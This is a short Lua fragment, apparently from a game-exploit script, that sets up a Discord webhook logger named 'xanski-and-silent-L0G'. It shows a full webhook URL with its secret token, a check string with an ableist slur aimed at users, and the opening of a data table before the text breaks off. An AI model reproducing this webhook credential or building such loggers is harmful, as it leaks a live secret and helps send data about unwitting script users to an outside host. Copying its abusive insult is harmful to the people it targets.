...
local webhookcheck =
   ...
   "retarded skid with shitty executor"

local url =
   "https://discord.com/api/webhooks/1482518493415866581/-mCMVUvHqV6Z3goA9wqU-cvnKd-SBBT7tFS11T1C0hwLsdloJn5AX9gyMwS7PWWT109G" --pretty obvious what to do here
local data = {
            ["username"] = "xanski-and-silent-L0G", --webhook name thing idk
